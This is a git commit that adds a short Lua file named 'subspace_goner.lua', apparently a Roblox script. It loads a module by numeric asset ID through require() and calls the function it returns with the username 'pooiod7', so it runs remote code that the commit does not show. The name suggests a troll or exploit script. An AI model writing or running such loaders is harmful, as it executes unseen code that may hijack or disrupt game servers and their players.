e2a63048ff56811d4fcbd28742db880628dac332
pooiod7 <portsmouthuser35@gmail.com>
2025-05-03 22:31:56 -0400

    Create subspace_goner.lua

---
+++ subspace_goner.lua
@@ -0,0 +1,15 @@
+local id = 15307217424
+local user = 'pooiod7'
+local d = require(id)
+if type(d) == 'function' then
+	d(user)
+	return 0
+end
+if type(d) == 'table' then
+	for _, f in d do
+		if type(f) == 'function' then
+			f(user)
+			return 0
+		end
+	end
+end
